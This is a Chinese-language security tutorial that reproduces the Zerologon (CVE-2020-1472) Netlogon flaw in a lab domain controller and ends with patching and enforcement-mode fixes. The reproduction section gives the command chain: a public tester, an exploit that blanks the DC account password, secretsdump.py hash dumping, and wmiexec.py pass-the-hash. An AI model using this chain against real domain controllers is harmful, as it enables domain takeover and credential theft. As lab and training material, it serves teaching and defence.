<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/TaG135KzNIW07PdHsjCjxA)

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC6pRiabDicuyO5uBZsDB68SyC0XxgOZhLhlViaOZ1YCIFFeMJjrXWeooBlQ1e4FbKVVYYVGyuZZkicfBA/640?wx_fmt=gif)

本文由 “网络安全检测与防护技术国家地方联合工程研究中心深圳分中心——东塔网络安全学院” 总结归纳

**0x00 简介**

NetLogon 远程协议是一种在 Windows 域控上使用的 RPC 接口, 被用于各种与用户和机器认证相关的任务。最常用于让用户使用 NTLM 协议登录服务器，也用于 NTP 响应认证以及更新计算机域密码

**0x01 漏洞概述**

攻击者使用 Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接的 Netlogon 安全通道时，存在特权提升漏洞。当成功利用此漏洞时，攻击者可无需通过身份验证，在网络中的设备上运行经特殊设计的应用程序，获取域控制器的管理员权限。

**0x02 影响范围**

```
Windows Server, version 2004 (Server Core installation)
Windows Server 2008 R2 for x64-based Systems Service Pack 1
Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)
Windows Server 2012
Windows Server 2012 (Server Core installation)
Windows Server 2012 R2
Windows Server 2012 R2 (Server Core installation)
Windows Server 2016
Windows Server 2016 (Server Core installation)
Windows Server 2019
Windows Server 2019 (Server Core installation)
Windows Server, version 1903 (Server Core installation)
Windows Server, version 1909 (Server Core installation)
```

**0x03 环境搭建**

环境：Windows2008R2

1. 下载 windows2008R2，在 VMware 中安装虚拟机，安装完成后在 windowsR2 中安装 AD 域控。

2. 首先把域控 IP 设置为静态 IP，DNS 地址设置为和静态 IP 一样的。然后把 ipv6 的前面的√去掉

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlZ3JxZSicWPibtiaXZyRTjPp7XvzAnXk15Xib4KibSl5AJBx6kq2LEOIMB7w/640?wx_fmt=png)

3. 安装域，点击 “服务管理器”，点击 “添加角色”，选择 AD 域服务一直点击下一步安装

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1Jlgfr9v9xxfk2cRA0AOYxyO0Ngia0QNibbxibzLXwArpibMNLdkJCgOPwnaQ/640?wx_fmt=png)

4. 安装完成后在完成界面点击域服务安装向导，点击下一步

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlVJzcPsgklc3YnAWwM3gVq0IGyUz3Sxwiakia2REGBhC0bZmj2duG8eibQ/640?wx_fmt=png)

4.1 选择 “在新林中新建域”，点击下一步，设置一个域名

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1Jll5W5zsF0oKaOBKqFwZibYhZxztxH7E1XOGnx9Z8epKpTjgJ8ibJSXcOw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlcKcCj3WrSqvBmteVy6MUkwzLYDmpvPqmv5h0fTCXIVkJtBnKrdSRWw/640?wx_fmt=png)

4.2 在林功能级别选择 windows2008R2, 点击下一步安装 dns，这里选择 “是” 即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlzDUxpZNvsPeGVicicvwdDBPeScfYCgSia2Rv04Yia85zuGBFfQKau9efwA/640?wx_fmt=png)

4.3 一直下一步设置密码，下一步安装完成重启计算机即可

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlNMTApKluelfrZ3cylFqSAs0bGDic20iaMQ0JPtQrd9vtqf26IibZY5MyA/640?wx_fmt=png)

**0x04 漏洞复现**

1. 使用 poc 验证目标机器是否存在漏洞，poc 需要在 python3 中安装 impacket 依赖包

```
Poc下载地址：https://github.com/SecuraBV/CVE-2020-1472
pip install -r requirements.txt
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlibUAjtOqibQPVv6bqGhb7SkK32fM1UI8xK9zStphGtiaMpIxoKACnXn7g/640?wx_fmt=png)

```
python3 zerologon_tester.py 计算机名 域控IP
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlVTfa2HibPNdwiccliclH65SbUhmFZibZ6UnlrfeBKGKYu53eT7RVdpDUlw/640?wx_fmt=png)

2. 漏洞利用，下载漏洞利用的 exp 进行漏洞利用

```
https://github.com/blackarrowsec/redteam-research
python3 CVE-2020-1472.py DC-name NetBIOS-name Target-ip
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlxawGJEuOPPZKC6FiaJsO5nq22xhwHpgt6mam7uIUNZ5YgaO4289WQLA/640?wx_fmt=png)

3. 执行以上 exp 后密码重置为空，安装 python3 的 impacket 扩展，使用 secretsdump.py，dump 出密码

```
pip3 install impacket
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlxAJHANRRWgxXFYQrlIxBTb8mnovnRU8jUxlp7L026OHe40mns66rNg/640?wx_fmt=png)

```
python3 secretsdump.py test1.com/WIN-TSFNUKNLOPJ$@172.16.1.110 如果是kali需要在$@前添加\
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1Jl1hMhZ4j0jdtYtNtc6zIuwWvUK5N9FgEP4dxD9rPib0AyL0UIDWFDTdQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1Jl3wzh2sgibAY4vDahQcuV4h0JAL0Nx722BFZVgRGUKyR3IXln8oHsiaVg/640?wx_fmt=png)

4. 在使用 Impacket 库中 wmiexec.py 脚本使用 administrator 的 hash 横向连接过去

```
wmiexec.py -hashes administrator的hash值 test1.com/administrator@172.16.1.110
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlOye2gZYmE3ibwoe6MtEPrhxicXzUffqZnoeIo1L35KbbIpRGzG3EcoGw/640?wx_fmt=png)

**0x05 漏洞修复**

1. 开启 DC 强制模式

开启的 DC 的强制模式，具体可参考下面的链接进行操作

```
https://support.microsoft.com/zh-cn/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc
```

2. 应及时进行 Microsoft Windows 版本更新并且保持 Windows 自动更新开启。

3. 在微软官方下载相关的漏洞修补补丁

免责申明：   

本项目仅进行信息搜集，漏洞探测工作，无漏洞利用、攻击性行为，发文初衷为仅为方便安全人员对授权项目完成测试工作和学习交流使用。

请使用者遵守当地相关法律，勿用于非授权测试，勿用于非授权测试，勿用于非授权测试（重要的事情说三遍），如作他用所承受的法律责任一概与东塔网络安全学院无关！

东塔网络安全学院在各大平台均上线了各项活动和学习内容，快快登录以下各大平台学习起来吧~  

微博、腾讯课堂、知乎、今日头条、抖音：

东塔网络安全学院

哔哩哔哩：东塔网络安全

了解更多活动和咨询欢迎微信添加：dongtakefu

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JldsMkrPOwpWaVUsiax02GceYtkAoDOm0SIGN5o9TMLQdNH3ntUBQRe6Q/640?wx_fmt=jpeg)

- 免费获取学习资料

电子书籍、试听课程 -

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_png/UKJ0CBLX4Gpou71jatnzPXHbJrdbP1JlLhnicAzSpibT9TOXpOGc9Gibe2dpicOyEibzY7aON9pAXzuO2YzlXMoqVDQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucChaE0GfBticZTQQq7TyhaiaeptZbqmENrZO6pazDwFpVB6aTFicgLwngsOuNLMY3sIMxddybn82O4Q8w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucChaE0GfBticZTQQq7Tyhaiaepl2oEubhGdZoAicHvXAYeSiarPXAy9OXNtJiaCkvviccX0w0Z0t0ibBnnD2Q/640?wx_fmt=png)

点击蓝字

分享我们